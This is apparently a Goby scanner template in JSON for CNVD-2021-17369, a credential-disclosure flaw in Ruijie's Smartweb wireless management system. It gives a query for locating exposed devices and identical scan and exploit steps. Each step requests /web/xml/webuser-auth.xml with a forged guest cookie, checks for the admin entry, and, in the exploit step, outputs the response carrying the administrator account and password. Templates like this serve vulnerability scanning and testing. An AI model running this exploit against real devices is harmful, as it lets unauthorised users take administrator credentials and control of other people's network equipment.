{
      "Name": "Ruijie Smartweb Management System Password Information Disclosure CNVD-2021-17369 ruijie-smartweb",
      "Level": "0",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "app=\"Ruijie-WiFi\" && title=\"无线smartWeb--登录页面\"",
      "Description": "Ruijie Networks Co., Ltd. is a provider of ICT infrastructure and industry solutions. Its main business is R&D, design and sales of network equipment, network security products and cloud desktop solutions.",
      "Product": "Ruijie Smartweb Management System",
      "Homepage": "http://www.ruijie.com.cn/",
      "Author": "",
      "Impact": "The wireless smartweb management system of Ruijie Networks Co., Ltd. has a logic flaw. An attacker can obtain the administrator account and password from a low-privileged user, thereby escalating the low-level privilege to the administrator's privilege.",
      "Recommendation": "",
      "References": [
            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/web/xml/webuser-auth.xml",
                        "follow_redirect": false,
                        "header": {
                              "Cookie": "login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest"
                        },
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "&lt;![CDATA[   admin]]&gt;",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/web/xml/webuser-auth.xml",
                        "follow_redirect": false,
                        "header": {
                              "Cookie": "login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest"
                        },
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "&lt;![CDATA[   admin]]&gt;",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|undefined|undefined"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}